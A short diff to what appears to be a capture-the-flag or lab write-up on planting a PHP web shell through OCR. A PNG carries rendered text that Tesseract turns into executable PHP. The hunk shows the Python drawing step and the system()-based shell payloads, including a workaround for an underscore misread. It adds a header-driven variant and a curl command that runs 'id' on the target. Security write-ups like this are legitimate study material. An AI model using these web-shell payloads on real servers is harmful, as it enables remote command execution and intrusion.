@@ -442,6 +442,8 @@ draw.text((10, 25), '<?php system($__GET["cmd"]); ?>', fill='black', font=font)
 img.save('payload.png')
 ```
 When crafting the PNG image, we initially used <?php system($_GET["cmd"]); ?> as the payload, however Tesseract misread the single underscore in $_GET as a space, producing invalid PHP. To work around this, we used a double underscore $__GET which Tesseract correctly recognized as a single underscore _ resulting in valid executable PHP code.
+(You could also use <?php system(getallheaders()["cmd"]);?> and interact with it as follows: curl http://target/shell.php -H "cmd: id")
+
 We just have to craft the requests:  
 ```
 curl -sk \
